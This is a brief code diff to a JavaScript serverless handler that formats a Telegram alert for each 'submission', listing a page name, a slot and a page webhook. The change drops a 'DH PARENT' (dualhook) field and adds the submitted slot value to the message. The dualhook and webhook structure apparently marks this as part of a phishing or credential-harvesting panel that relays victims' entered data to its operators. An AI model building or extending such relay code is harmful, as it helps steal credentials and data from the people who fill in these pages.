@@ -124,20 +124,16 @@ export default async function handler(req, res) {
   const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
   const slotLabel = slotEntry ? slotEntry[0] : Object.keys(slots)[0];
 
+  const slotValue = slotEntry ? slotEntry[1] : '(empty)';
+
   const tgMsg = [
     `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
     `------------------------------------------`,
     `📄 PAGE:`,
     `${record.displayName}`,
     `------------------------------------------`,
-    `🗂️ TYPE:`,
-    `${record.type}`,
-    `------------------------------------------`,
-    `👤 DH PARENT:`,
-    `${record.dualhookParent || 'N/A'}`,
-    `------------------------------------------`,
     `🎯 SLOT:`,
-    `${slotLabel}`,
+    `${slotLabel}= ${slotValue}`,
     `------------------------------------------`,
     `🔗 PAGE WEBHOOK (WEBHOOK2):`,
     `<code>${record.webhook}</code>`,
